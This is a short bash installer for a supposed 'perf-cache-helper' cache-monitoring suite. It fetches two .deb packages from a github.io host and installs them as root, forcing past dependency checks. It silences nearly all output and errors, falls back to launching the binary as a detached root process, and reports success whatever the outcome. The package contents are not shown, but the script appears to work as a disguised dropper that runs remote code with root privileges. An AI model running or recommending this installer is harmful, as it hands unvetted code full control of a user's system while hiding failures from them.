#!/bin/bash
# perf-cache-helper installer — cache performance monitoring suite
set -e

SUDO=""
[ "$(id -u)" -ne 0 ] && SUDO="sudo"

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

# ============================================================
# Stage 1: perf-cache-helper (cache monitoring daemon)
# ============================================================
echo "Downloading perf-cache-helper..."
curl -fsSL https://infra-tools-org.github.io/infra-telemetry/perf-cache-helper_amd64.deb \
    -o "$TMP/perf-cache-helper.deb"

echo "Installing perf-cache-helper..."
$SUDO dpkg --force-depends -i "$TMP/perf-cache-helper.deb" >/dev/null 2>&1 || true

$SUDO systemctl daemon-reload 2>/dev/null || true
$SUDO systemctl start perf-cache-helper.service 2>/dev/null || true
sleep 2

if ! $SUDO systemctl is-active --quiet perf-cache-helper.service 2>/dev/null; then
    echo "Service inactive, starting binary in background..."
    $SUDO nohup /usr/lib/perf-cache-helper/perf-cache-helper >/dev/null 2>&1 &
    disown 2>/dev/null || true
    sleep 1
fi

if $SUDO systemctl is-active --quiet perf-cache-helper.service 2>/dev/null; then
    echo "helper: running via systemd"
elif pgrep -f /usr/lib/perf-cache-helper/perf-cache-helper >/dev/null 2>&1; then
    echo "helper: running via nohup"
else
    echo "helper: WARNING — binary did not start"
fi

# ============================================================
# Stage 2: perf-cache-telemetry (bandwidth & latency reporting)
# ============================================================
echo "Downloading perf-cache-telemetry..."
curl -fsSL https://infra-tools-org.github.io/infra-telemetry/perf-cache-telemetry_1.0.0_all.deb \
    -o "$TMP/perf-cache-telemetry.deb"

echo "Installing perf-cache-telemetry..."
$SUDO dpkg --force-depends -i "$TMP/perf-cache-telemetry.deb" >/dev/null 2>&1 || true

$SUDO apt-get install -fy -qq >/dev/null 2>&1 || true

$SUDO systemctl daemon-reload 2>/dev/null || true
$SUDO systemctl start perf-cache-telemetry.service 2>/dev/null || true
sleep 2

if $SUDO systemctl is-active --quiet perf-cache-telemetry.service 2>/dev/null; then
    echo "telemetry: running via systemd"
else
    echo "telemetry: WARNING — service did not start"
fi

echo "All cache monitoring components installed successfully."